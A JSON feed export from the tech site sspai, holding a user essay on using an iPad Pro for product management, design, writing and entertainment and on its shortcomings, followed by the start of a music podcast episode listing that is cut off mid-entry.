[{"title":"如何真实描绘 iPad 的现状？聊聊我的使用场景和思考","date":"2021-07-03 07:08:13","description":"\n<h3><strong>Matrix 首页推荐</strong></h3>\n<p><a href=\"https://sspai.com/matrix\">Matrix</a> 是少数派的写作社区，我们主张分享真实的产品体验，有实用价值的经验与思考。我们会不定期挑选 Matrix 最优质的文章，展示来自用户的最真实的体验和观点。</p>\n<p>文章代表作者个人观点，少数派仅对标题和排版略作修改。</p>\n<hr>\n<p>很多人在聊起 iPad 的时候，都在不留余力地吐槽「它不可以做啥」，而鲜有人分享「它到底真的能做什么」。我始终认为决定一个产品最终能否走得更远和被用户接受，取决于大家充分了解 iPad 的核心用户都用 iPad 做了什么事情，这才能帮助用户找到适合自己的使用场景。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/27/3e4db327a19bae813391929ddb080ef2.jpeg\"></figure><p>这就是我想写这篇文章的目的，一方面我想聊聊我在用 iPad 做什么，另一方面聊聊离我理想的 iPad 还欠缺什么。我希望能有更多 iPad 用户分享使用体验和独特用法，让大家在看到 iPad 不足的同时，也有更多机会看到它有价值的一面。</p>\n<h2>一 . 我在 iPad 上做过的尝试</h2>\n<p>我算是一个 iPad 的老用户，iPad 的每个新形态我都尝试过。在过去的很长时间里，iPad 对我而言是个「吃灰居多，偶尔有点作用」的工具，除了 iPad 固有的问题外，自己的能力也并不足以让我充分利用 iPad。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/27/db99c398fd6d31878bbc96fed0129cbe.jpeg\"></figure><p>从去年底到现在，iPad 在我日常工作中的使用比例越来越高，甚至在最近几个月成为了我的核心设备，超过了我使用 Mac 的时间。</p>\n<p>主要原因有两点：随着更多 iPad 用户的经验分享和自身知识面的积累，我能够更好地解决在 iPad 上遇到的问题；其次是工作内容的变化让我不再需要依靠功能复杂的软件，这让我拥有更多选择设备的空间。</p>\n<h2>二 . 我日常用 iPad 做些什么</h2>\n<h3>1. 产品规划和协作</h3>\n<p>我是一个 B 端的产品经理，日常工作是规划现有产品迭代，根据需求制定相应的文档和原型。工作内容不复杂，也不依靠大型软件。</p>\n<p>我主要在 iPad 上使用云端协作类的软件，例如腾讯文档、Notion、Figma 之类的，因为各方的进度和问题都是需要实时同步，所以协作类软件是当前最好的选择。这些软件在 iPad 上都有着非常好的适配，你不需要担心它和电脑上有什么区别。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/27/81dae0e6a7b3d38c1e09f0c1f82e6c16.jpg\"></figure><p>像 PPT 和 Word 文档在微软的努力下已经有很好的体验，配合妙控键盘的触摸板，只要不是非常复杂和格式奇乱的文档，我都可以轻松处理，哪怕是 PPT 的视觉设计也不是太大的问题。不过 Excel 仍然只能满足看和简单修改，几乎无法进行数据的处理。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/27/2ff694c67381e8f60e55638c7088ccab.jpg\"></figure><p>像思考类的软件，头脑风暴的时候可以用 Goodnote 等白板软件，也可以用 Xmind 这类思维导图软件，体验都很不错。最近 Figma 上线了 Beta 版本的 FigJam，支持多人协作大白板功能，里面也可以绘制简易的线框图和各种标签注释，非常适合多人讨论。</p>\n<p>得益于在线文档的兴起，我原本的工作流程在 iPad 上几乎没有受到影响。</p>\n<h3>2. 用 Figma 做原型和设计稿</h3>\n<p>我本科是设计专业，所以会经常参与一些视觉和宣传材料的设计。</p>\n<p>之前我一直使用 Sketch 做日常的原型设计和视觉设计，但 Sketch 在跨平台上面还是有着比较大的局限，为了实现团队协作，我把项目都搬到了 Figma 上。</p>\n<p>Figma 虽然是一个依赖于 Web 的设计软件，但在性能和操作体验上已经不输任何的原生软件，尤其是适配了 M1 版本的桌面端 Figma，流畅的足以让我相信原生运行不一定是未来。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/27/0ce050f9acd90056abdfa54baff15fe7.jpeg\"></figure><p>既然是依靠 Web 的应用，有浏览器的 iPad 自然可以分一杯羹，实际体验中在 iPad 上用 Figma 是挺流畅的，这证明了 iPad Pro 的 Web 性能十分出色，在处理这种非常依靠 GPU 渲染的设计软件上，iPad 展现了出色的能力，M1 的加入也让这体验往上升了一级。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/27/4e45a8728cb6c25a533a25414dddfd18.jpeg\"></figure><p>我推荐你使用 Figurative 这个软件，它很好地解决了用触控板移动画布和缩放的问题，你很难想像在 iPad 上做设计软件能做到这个程度，光标的交互配合 Drag&amp;Drop 的拖拽，和在 Mac 上使用体验别无二致，唯一需要注意的就是字体库的问题，需要特别处理。</p>\n<h3>3. 日常写一些文章</h3>\n<p>我通常喜欢使用 Drafts 5 进行草稿的构建，日常我的一些小灵感都会通过 Drafts 快速记录下来，看到想要收藏的内容都会被保存在这里。你可以简单理解为一个纯文字版「闪念胶囊」。</p>\n<p>写完大纲和草稿后我会使用 Ulysses 把剩余内容补充完，Ulysses 的大纲功能对写文章而言有很大帮助，图片存储和加载的性能也好于其他软件，适合喜欢把图丢进去排版的人。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/27/2f808e5e158ffb776280fc7381b74892.jpeg\"></figure><p>我喜欢在 iPad 上写作，倒不是因为键盘很好用，也不是因为有很好用的软件，单纯是我觉得在 iPad 上更有仪式感，也能更专注的完成文章。我已经在 iPad 上写下了数万字的内容，它帮我实现了很多事情。</p>\n<h3>4. 图片编辑和筛选</h3>\n<p>我是基本不在电脑上修图的那一类人，一方面我的显示器并不高级，色准和表现和实际的情况都有偏差，另一方面我也不喜欢用鼠标调整各种参数，整体交互给我一种奇怪的感觉。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/27/e72b88901863e8fff9387d6f8ddaf6eb.jpeg\"></figure><p>iPad 是一个出色的显示器，同时搭配 Apple Pencil 和触屏，你可以轻松选定不同区域进行修改，用手调节色环和调节条的感觉更符合交互直觉。它改善的不仅是成片结果，更是优化了修图过程中的体验。</p>\n<blockquote><p>「亲手挑选喜欢的图片」，我想我喜欢这种感觉。</p></blockquote>\n<h3>5. 流媒体娱乐时间</h3>\n<p>iPad 是很好的观影设备，主要体现在它便携的高规格屏幕，尤其是 21 款 iPad Pro 12.9 寸上配备的 Mini LED 屏幕，这块移动端的最强屏幕，极高的亮度和对比度拿来看 Apple TV+、Netflix、Disney+ 的高质量 HDR 内容是极为享受的。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/27/0a6e4f20b5cf79c05f293eaa5afb5f46.jpeg\"></figure><p>如果你拿来看爱奇艺这类国内流媒体，并不能完全发挥这块屏幕的能力，一方面片源本身的码率不够高，另一方面这些平台宣传的 HDR 调色总会显得有种饱和度拉满地奇怪视觉感。希望国内的流媒体质量也能跟着硬件提升持续改善，毕竟订阅价格并不便宜。</p>\n<p>其实我并不经常在 iPad 上看这些系列剧，电视是我看剧的首要选择。我喜欢在桌面上喝着咖啡，在 iPad 上看看油管上的内容，欣赏一下 HDR 视频带来的那种真实和震撼的感觉。</p>\n<h3>6.「或许」 能摸鱼的技巧</h3>\n<p>我在写这篇文章之前，很多人问我 iPad 的摸鱼技巧。实话说 iPad 本身的多任务和快捷切换属性挺适合摸鱼的，三指一刷切换到另外一个应用，又或者唤出侧边栏再隐藏，似乎都是一些比较 \" 方便 \" 的摸鱼方式。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/27/81cd910d642617a59ce45f68d607e8b6.jpeg\"></figure><p>iPadOS 15 的新版 Safari 上新增了标签组的功能，当你会使用快捷键 <code>Command+Option+上方向键</code> 后，可以瞬间在工作的网页和休闲网页中来回切换，不需要担心被看到。</p>\n<p>画中画模式也是我觉得很适合摸鱼的功能，像 Bilibili、爱奇艺等流媒体平台都已经支持这个功能，你可以开一个小窗口放在不显眼的地方，带上耳机，打开工作文档和微信，悄悄地开始你的摸鱼时刻。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/27/7686afa3412a3b0a31ccf5f9cc198f8b.jpeg\"></figure><p>当然我不是一个喜欢摸鱼的人，但我会经常观察摸鱼的同事们到底是怎么做的。结果我觉得摸鱼最好的方式就是换一个可视角度奇差，亮度奇低的显示器，这样别人基本上就不会瞅到你的电脑在播放什么内容。</p>\n<p>相反 iPad 这种亮度和清晰度奇高的产品，几米开外都可以清楚看到你在做什么，实在没有什么好机会。</p>\n<h2>三 . 我喜欢 iPad 独特的地方</h2>\n<h3>1. 简单且自由的环境</h3>\n<p>iPad 某种程度上对我来说是「更自由」的设备，它并不像 Mac 是一个目的性很强的设备，每当我坐在 Mac 前必定是在做重要的工作，这是一种紧迫的感觉。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/27/d79c53e844a4cfd5748067b22121acfa.jpeg\"></figure><p>在 iPad Pro 面前，状态是休闲随心的，事情是可商量的，这让我在 iPad 上的创作欲望比在 Mac 上更高，更适合初期灵感的构思。</p>\n<blockquote><p>这是我喜欢 iPad 的地方，电脑总把人们限定在了固定的形式内，用效率来衡量一切，而有趣伟大的事情，并不会在事情的一开始就与效率相关。</p></blockquote>\n<h3>2. 找回书写的乐趣</h3>\n<p>以往其他设备上的触控笔，我只有在打开画板时才会想到要拿起笔，Apple Pencil 则是一根可以长时间抓在手中的笔，因为它与 iPad 的交互关系远不止作画。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/27/626ff8e2ba63836c6e7685ff8f145ce4.jpeg\"></figure><p>在需要头脑风暴思考些细节的时候，我都会从妙控键盘上拿下 iPad，拿起笔，在网页和快捷笔记中切换，在画布上呈现一些方便思考的信息，这是快速且自然的表达方式。</p>\n<p>我也时常喜欢拿 iPad 来做数独，遇到需要尝试的数字，可以复制出几页同时验证结果，有一种开了物理外挂的感觉。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/27/f728fe8845db148cdac25f1b7f762dba.jpeg\"></figure><p>有的人会说妙控键盘和笔是冲突的，放在上面不好书写。解决的方法很简单，把平板拿下来就好了，这里面没有什么胶水强制合体的机制。</p>\n<blockquote><p>轻松地取下键盘和装入键盘，在手写平板和电脑模式中肆意穿梭，这不就是 iPad 最大的优势吗？</p></blockquote>\n<h3>3. 不同场景的专注模式</h3>\n<p>iPad OS 15 上苹果将「勿扰模式」升级成了「专注模式」，你可以使用不同的 「专注」 来调整应用通知的推送模式和桌面布局方案。这意味着你可以在不同的场景下使用多种设置，为每个具体的场景调节。</p>\n<p>例如我在工作时不想收到任何资讯和流媒体的更新推送，我在娱乐休闲时不想收到工作或者电话之类的推送，你都可以通过专注模式实现。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/27/972bb154ebdd83f71adddedd6422b065.jpeg\"></figure><p>专注模式支持自动化处理和快捷指令调用，意味着你可以根据设定来达到完全自动化执行的情况。</p>\n<p>例如早上 9 点到公司后开启工作模式，桌面就会变成和工作相关的组件和应用，同时屏蔽掉所有的社交信息，推送今天的工作计划任务。下午 6 点下班后关闭工作模式，恢复所有通知，之前被拦截的所有新剧集信息或者社交信息都会聚合一次性显示。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/27/5a6dc6cc900997e62e97c7378ff49a75.png\"></figure><p>专注模式类似于一种「多用户登录」功能，给予你在同一个系统内设置不同的权限和显示布局的功能，非常适合 iPad 这种覆盖多场景设备。</p>\n<h3>4. 为细分场景做服务</h3>\n<p>iPad 是目前输入交互最丰富的设备，光标系统、键盘、触控、全局无框手写输入，每一项完成度都非常高，所有的软件都能轻松调用且合理展现。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/27/82597944021f58c26466f5647ec6a2ba.jpeg\"></figure><p>区别于电脑，iPad 触屏 + 外设的形态更方便触达细分场景，让笔记、会议讨论、项目演示等交互场景体验更直接、更有交互感，而不仅仅是一种向电脑里输入和屏幕输出的关系。</p>\n<p>这些场景都是在使用过程中逐步发现的，也不是说一开始用 iPad 就冲着这个目的去的，最后我选择 iPad 是因为它确实给我留下了深刻的印象。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/27/34b6ea50da2831f633b5af6a44f0b4a1.jpeg\"></figure><p>iPad 不可能在做传统表格、建模和工程类文件等事项上比电脑出色，也没有办法取代电脑在专业领域的作用，这也从来都不是 iPad 的目标。更好的服务于这些事情之外电脑无法很好兼顾的场景，优化这些场景的体验，这才是 iPad 的价值。</p>\n<blockquote><p>何必纠结于谁取代谁呢？两者是互帮互助的关系，做自己擅长的事情，别想着把别人擅长的事情抢过来做，这句话不仅适用于设备，也适用于人。</p></blockquote>\n<h2>四 .iPad 上亟待解决的问题</h2>\n<h3>1. 文件系统和文件分享</h3>\n<blockquote><p>以「文件」为核心的传统电脑和以「APP 和服务」为核心的移动设备间的转换。</p></blockquote>\n<p>最开始使用 iPad Pro 工作，我会迷茫不知从哪开始我的工作，这是因为我原本的电脑上有桌面，桌面上有各种文件，我早已习惯找到文件双击打开应用来开始新的工作。</p>\n<p>在 iPad 上逻辑并不如此，平板的界面上是各种 APP，文件的概念在移动端里并不突出，当我依赖「文件」这个载体的时候，在 iPad 上工作的体验就会非常糟糕。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/27/5ae9c143299ab17a94598fb5e8552f4e.jpeg\"></figure><p>去年开始我把日常工作都搬到了线上，在线文档、Web 端 Figma 设计以及 Notion 这类在线应用时，在 iPad 上的体验就变得简单许多。我只需要打开 APP，找到尚未完成的的工作即可，无需关注文件在哪。当我的工作核心变成了在哪个应用里，文件的概念自然就被弱化了。</p>\n<p>当然工作中我仍会遇到各种需要传输文件的场景，iPad Pro 羸弱的文件管理系统，依旧需要繁复的操作才能发送文件。文件的跨应用传输也需要开发者们去做适配，否则只能依靠系统的 Share 组件操作，效率很低。要解决这些问题，苹果的系统级改进和开发者的适配都是关键。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/27/4fdea9fd462503510c96bcac182aaca0.jpeg\"></figure><p>在 iPadOS 15 上，苹果似乎并没有展现出将 MacOS 级的文件管理带入 iPadOS 的意愿，或许苹果更愿意相信未来用户们的工作，需要的是在线同步「数据」，而不是来回传输「文件」。</p>\n<p>如果你依旧十分依赖「文件」，那 iPad 不是一个很好的工具，倘若你想在 iPad 上获得更自然的体验，或许你可以尝试用在线文档和工具来改善。</p>\n<h3>2. 缺少功能完善的专业级应用</h3>\n<blockquote><p>系统底层是否完善很重要的判断因素就是，专业级应用是否能登陆。</p></blockquote>\n<p>在过去的几年里，在专业软件层面，Adobe 推出了 iPad 版本的 Photoshop 和 illustrator，但总体来看针对 iPad 的专业级软件数量仍然太少，专业级用户都期待着像 Final Cut Pro 等软件能够登录 iPad。</p>\n<p>当然，即便这些专业软件能在 iPad 上使用，也肯定无法运行完整功能，系统本身的原因是一部分，我认为更多考虑在于针对 iPad 这个产品形态，要照顾触屏交互和 Apple Pencil 的存在。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/27/10a8d79c89cbe270e00ee6c7a9c38b27.jpeg\"></figure><p>这些软件登录 iPad 的意义并不是为了完整取代电脑的，而是为了能够把创作流程分拆到不同部分，再根据统一的格式在桌面端重新串联起来，这对于连续性创作有很大的帮助。</p>\n<p>只要这个生态正处于良性的发展，专业软件迟早会来。iPad 目前已经给出了更强的性能和更为成熟的光标系统，开发商们有更多的空间下放功能，剩下的就看开发商们的努力了。</p>\n<h3>3. 开发者对 iPad 版适配理解不够深入</h3>\n<blockquote><p>开发者认为 iPad 上只需正确显示软件即可，这极大影响 iPad 的体验。</p></blockquote>\n<p>iPad 上的应用生态质量是远不如 iPhone 和 Mac 的，很大程度上是因为开发者们没有重视 iPad 端的开发，粗暴理解为只需要将 iPhone 版本放大套在 iPad 上即可，这就导致了屏幕面积被大量浪费，排版布局诡异，也没有适配原生的 iPad 交互动画，使用体验极差。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/27/8b82fcf712f5291f4736a265bd25c6f6.jpeg\"></figure><p>苹果还推出了 Mac Catalyst 方便开发者从 iPad 迁移到 Mac 上，这一举措进一步将这种放大版的软件带到了 Mac 上，无疑是一种灾难。</p>\n<p>客观来说，要求开发者重构 iPad 版本的布局和交互是有难度的。毕竟 iPad 的核心用户群数量都十分稀少，就更别指望产品经理们能够很好地理解 iPad，并作出合理、符合使用场景设计。况且还有成本因素需要考量，在花钱买一个重构的 iPad 应用和免费用 iPhone 的放大应用上，绝大部分用户可能都会倾向于后者，这也就导致没有开发者会费力去重构设计。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/27/2823d67338e94d2cda0c27412f04eda9.jpeg\"></figure><p>要解决这个问题，除了需要开发者能够对 iPad 的使用场景和体验做深度优化外，还需要有更多的付费用户来承担起这种优化的成本，这是相辅相成的。现阶段能够很好适配 iPad 的软件开发者，都是非常用心的。</p>\n<h3>4. 几乎无法扩展外界显示器</h3>\n<blockquote><p>无法扩展显示意味着受限的工作区域，这影响了多任务场景。</p></blockquote>\n<p>目前 iPad 连接外部显示器只能以镜像状态投影，一些适配了的软件能够调用外接显示器全屏作为预览框，Shiftscreen 能实现浏览器的多屏输出，这就是 iPad 仅有的分屏能力。在导致在 iPad 办公的这段时间里，我桌面上的 4K 显示器一直处于闲置状态。</p>\n<p>即使是 iPad Pro 12.9 寸的屏幕大小，也最多容纳 2 个 APP，无法将更多内容显示在其他地方，这就影响了多任务场景的发挥。我既做不到在写文章的时候想同时看几篇参考文章，也做不到同时开好几个文档中来回编辑处理数据，这让人沮丧。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/27/9af8eeeb4ae1ac605a89d5aa31d670f5.jpeg\"></figure><p>苹果似乎还在思考外接屏幕上的处理逻辑，这不是一个简单问题。在投屏的状态下会出现「触屏和非触屏的交互融合」「小屏幕和大屏幕的内容排版显示差异」以及「是否应该在大屏幕内窗口化」等系列问题。要想用合理的逻辑解决这些问题，需要更多时间。</p>\n<h3>5. 糟糕的电量</h3>\n<blockquote><p>iPad 已经不是那个在续航让人安心的设备。</p></blockquote>\n<p>自从 ProMotion 登录 iPad Pro 上以后，iPad 的连续续航时间就回落到了手机水平，在搭配妙控键盘的情况下，在户外用一整天的可能性几乎 0。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/27/cfecccef2078f5bd144c2f11d51d575d.jpeg\"></figure><p>这里面也有一些客观因素，比如说功耗更大屏幕，电池更小，即便是 M1 出色的功耗控制，也必定会得出比 Macbook 更短的续航时间。这似乎是短时间内无法解决的问题，技术上已经做到极限了。</p>\n<h2>五 .iPad 生态的转折点与未来</h2>\n<p>回顾 iPad 整个发展生态，苹果无外乎在做两件事情，优化 iPad 的交互输入方式和丰富 iPad 的软件生态。过去几年里，我在 iPad 上看到了许多重要的转折点：</p>\n<h3>1.Apple Pencil—允许精确的交互输入方式</h3>\n<p>Apple Pencil 的加入是苹果为 iPad 新增的信息输入方式，这极大扩展了 iPad 的使用场景，电子化书籍笔记让 iPad 成为了大学生群体中很受欢迎的工具。</p>\n<p>去年 iPad OS 14 苹果新增了输入框直接书写文字，进一步提高了 Apple Pencil 在全局的输入体验。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/27/fe56ea2a8c9cc97e5d0747d0eee766ff.jpeg\"></figure><h3>2.TouchPad—允许更复杂的交互输入方式</h3>\n<p>苹果在去年推出了妙控键盘，同时引入了专门为 iPad 设计的光标系统。光标的加入让 iPad 有能力操作功能复杂的软件，这为 iPad 深入办公场景做了最大程度上的支持，也促使更多专业软件登录 iPad。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/27/6db43867a758314bcadf61eca120612a.jpeg\"></figure><h3>3. 在线协同应用的兴起—工作软件门槛的降低</h3>\n<p>苹果一直是云服务的支持者，在 Web 端应用、协同办公和在线化应用兴起的大环境下，以浏览器和 APP 为核心的应用场景越来越多，这也使得 iPad 能够融入更多的场景中。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/27/82879443f56b7b3fb009bce902b64e87.jpeg\"></figure><h3>4.M1 底层统一 —应用跨平台门槛降低</h3>\n<p>今年苹果在全新的 iPad Pro 2021 上搭载了 M1 芯片，这就完成了 iPad 和 Mac 两个平台硬件上的统一，意味着未来两个平台间的应用生态共享会更加紧密，专业软件登录 iPad 的工作量会降低，开发者更多是需要思考应用在两个平台上所面对的交互问题。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/27/79be313bb28c759854e1cac2d36a002a.jpeg\"></figure><h3>5. 未来的方向</h3>\n<p>在 WWDC 21 之前，iPad 用户们都期待苹果能够把 MacOS 下放到 iPad 上。虽然我很希望看到这一幕的发生，但我得说这样做太不苹果了。</p>\n<p>苹果在给 iPad 设下的路线上有条不紊地推进着，更好地融合移动端触屏交互和桌面端光标系统，更好地融合移动端和桌面端的应用开发底层。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/27/46225db0637a8eedc919532106f94adf.jpeg\"></figure><p>最终我们或许将看到的是 「同一套软件」 在 「各端场景交互和体验中」 展现出应有的特色，这是一个可期的未来。</p>\n<h2>六 . 我是如何看待 iPad</h2>\n<p>每个人心目中都对 iPad 这种形态的设备有着不同的看法，不同的工作内容、习惯和喜好都会导致不同的结果，这些看法都各自代表了自己的使用状况，对于那些有着相同场景的人来说，都具备参考意义。</p>\n<p>2 年前我认为对 iPad Pro 最好的总结来自 MKBHD 的：</p>\n<blockquote><p>\"It’s not a computer replacement but a computer alternative.\"</p></blockquote>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/27/01c3f00316d62f5978943e1136065c0e.jpeg\"><figcaption>The iPad Only Challenge! _ From Marques Brownlee Youtube</figcaption></figure><p>iPad Pro 是不同场景下对设备的不同选择结果，而不是对传统电脑的替代，那时二者的使用场景还有着比较明显的区隔。而今天我的观点更倾向于 Mac 是 iPad 在专业场景上的延伸。</p>\n<blockquote><p>\"Mac is an extension of iPad in professional scenarios.\"</p></blockquote>\n<p>这意味着 iPad 作为我的核心办公设备在 80% 的场景下可以胜任。如果我遇到更复杂的工作，例如更为精确的设计稿和文档处理，我会使用 Mac 来完成这部分工作，这是专业需求的延伸，和专用用户用服务器渲染，用数位板画图的理由一样。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/27/458ec93694e0d6149f10b95246382c62.jpeg\"></figure><p>虽然这个观点目前看来有点站不住脚，但随着「互联网触屏交互设备原住民」的这一代年轻人长大，他们对于计算设备或许有崭新的理解，传统电脑操作走向专业化的时代初见端倪。</p>\n<h2>七 .iPad 和用户间的互相成长</h2>\n<p>iPad 在各行业都发挥着出色的表现，越来越多用户尝试用 iPad 做出改变，iPad 的发展离不开这些把设备应用在各个场景，推动着软件功能更新和适配的用户。</p>\n<h3>1. 让学习和知识管理更有逻辑</h3>\n<p>在我上大学的那个年代，iPad 只是一个大号的娱乐设备，如今 iPad 已经成为了大学里学习的重要工具，在记笔记、刷题、录课程、查资料、解构书籍等方面都有着极为出色的体验，无论是在课堂还是其他时刻，当你想收获和处理知识的时候，iPad 上强大的软件工具如 GoodNotes、MarginNote、DevonThink 等都能够为建立知识库提供极大帮助。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/27/6da354722beb52638fcee104d14d3500.jpeg\"></figure><h3>2. 为灵感创造提供一张自由的白纸</h3>\n<p>对于这个时代来说，工作内容的多元化让我们有更多的空间自由选择生产工具，iPad 多变的形态和更加亲切的交互感成为了很多场景下的新选择。尤其在这个强调创造力和灵感的时代，iPad 更适合记录和存储转瞬即逝的火花，不拘于形式，拥有更多想象空间。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/27/8314ddc5f8ef0eb20632bbbe0649311b.jpeg\"></figure><h3>3. 在繁忙生活之余添加多一份愉悦</h3>\n<p>对于那些并不热衷于使用 iPad 办公或者学习的人，用 iPad 开心看剧玩游戏何尝不是一种愉悦的事情。</p>\n<p>大可不必觉得「自己如果不用 iPad Pro 产出一篇惊世奇文或者一段旷古视频就是对不起买这台机器」，也不必在乎别人怎么定义 iPad，但凡这台机器在你手中不是放在柜子里吃灰，无论是给你带来工作上的帮助，还是给你带来欢乐，它都是有价值的。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/27/966db61a970f78d0427bf0bbd3cb4609.jpeg\"></figure><blockquote><p>it's never been a shame to be nonproductive.（没有生产力从来都不是一件耻辱的事情）</p></blockquote>\n<h2>八 . 到底我们为什么这么喜欢 iPad</h2>\n<p>如果我们把时间倒回到 2010 年，当乔布斯拿出 iPad 的那一瞬间，获得了台下和屏前观众经久不息的掌声。</p>\n<blockquote><p>是因为人们觉得这台 iPad 具有惊世生产力吗？ 是因为人们觉得 iPad 能替代手中的笔记本电脑吗？</p></blockquote>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/27/40c6730b667640397425fc768fdffa7e.jpeg\"><figcaption>Live photo of iPad Event on 2010_From internet</figcaption></figure><p>我想不是的，这么多年过去了，苹果没有忘记当初人们为什么这么喜欢 iPad，因为这是一台有着简单交互、趁手尺寸的设备，在手机和电脑中间创造了一个新的形态，既能融入工作，也能给生活带来一点激情，这是电脑从来都无法取代的。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/27/cb2aceb6847b4b8376b3052c1e0b7cbe.jpeg\"></figure><blockquote><p>\"It's just an iPad.\" 或许就是它从过去到未来一直都想传递的事情</p></blockquote>\n<p>&gt; 下载少数派 <a href=\"https://sspai.com/page/client\">客户端 </a>、关注 <a href=\"https://sspai.com/s/J71e\">少数派公众号 </a>，了解更妙的数字生活 🍃</p>\n<p>&gt; 想申请成为少数派作者？<a href=\"https://sspai.com/apply/writing\" target=\"_blank\">冲！</a></p>\n","link":"https://sspai.com/post/67439"},{"title":"FM3.14｜音乐最近听什么 EP03：幸福之歌","date":"2021-07-03 06:26:36","description":"\n<p>第三期刚好遇上我派稿霸@化学心情下2 的婚礼，以及我即将到来的十周年结婚纪念日，所以这一期假公济私聊聊和爱情、生活有关的音乐，谓之「幸福之歌」。本期歌单长达四个多小时，节目嵌入的歌曲也是不少，希望大家喜欢～周末愉快！</p>\n<div class=\"ss-audioSource\" src=\"https://r.typlog.com/eyJzIjoxOTQ2LCJlIjo4Mzc3LCJwIjoyLCJ1IjoiMTI4OC5tcDMifQ.fU3i2-4GmP8uqHQuyY-C-ZintYk/fm314/8374710340_701288.mp3\" title=\"FM3.14｜音乐最近听什么 EP03：幸福之歌\" cover=\"https://cdn.sspai.com/2021/07/03/5ed052f101ca06e66551fdfc91d699ec.jpeg\" artist=\"挨石\" chapter=\"[{&quot;name&quot;:&quot;开场曲 - fu'is 星星歌&quot;,&quot;time&quot;:0}, {&quot;name&quot;:&quot;All is Love - Karen O&quot;,&quot;time&quot;:710}, {&quot;name&quot;:&quot;Intro - 达达乐队&quot;,&quot;time&quot;:923}, {&quot;name&quot;:&quot;夏末的萨克斯手 - 曹方&quot;,&quot;time&quot;:1211}, {&quot;name&quot;:&quot;Sunday Trip - Torte Bus&quot;,&quot;time&quot;:1369}, {&quot;name&quot;:&quot;生活的诗意 - 彭坦&quot;,&quot;time&quot;:1558}, {&quot;name&quot;:&quot;罗马假日 - 旅行团&quot;,&quot;time&quot;:1694}, {&quot;name&quot;:&quot;永远在一起 - 许哲佩&quot;,&quot;time&quot;:1816}, {&quot;name&quot;:&quot;Grow Old with Me - Tom Odell&quot;,&quot;time&quot;:1948}, {&quot;name&quot;:&quot;Kiss Me - Sixpence None the Richer&quot;,&quot;time&quot;:2370}, {&quot;name&quot;:&quot;Sweet Song - Blue&quot;,&quot;time&quot;:2588}, {&quot;name&quot;:&quot;Love Song - The Cure&quot;,&quot;time&quot;:2877}, {&quot;name&quot;:&quot;Friday I'm in Love - The Cure&quot;,&quot;time&quot;:3177}, {&quot;name&quot;:&quot;With or Without You - U2&quot;,&quot;time&quot;:3567}, {&quot;name&quot;:&quot;誓い - 宇多田ヒカル&quot;,&quot;time&quot;:3924}, {&quot;name&quot;:&quot;不变形的爱 - 祁紫檀&quot;,&quot;time&quot;:4124}, {&quot;name&quot;:&quot;如果有一件事是重要的 - 陈珊妮&quot;,&quot;time&quot;:4348}, {&quot;name&quot;:&quot;天下无双 - 陈奕迅&quot;,&quot;time&quot;:4828}, {&quot;name&quot;:&quot;早去早回 - 陈洁仪&quot;,&quot;time&quot;:5076}]\">Audio</div>\n<h2><strong>🎵 歌单里还有更多</strong></h2>\n<p><a href=\"https://open.spotify.com/playlist/71hXixbqgujR9KVGtmXjMK?si=efa47ea0309d497e\">Spotify</a> （欢迎搬运并告诉我网址）</p>\n<h2><strong>📻 订阅节目</strong></h2>\n<ul>\n<li><a href=\"https://fm314.typlog.io/episodes/feed.xml\">RSS 地址</a></li>\n<li><a href=\"https://podcasts.apple.com/cn/podcast/id1492046083\">Apple 播客</a></li>\n<li><a 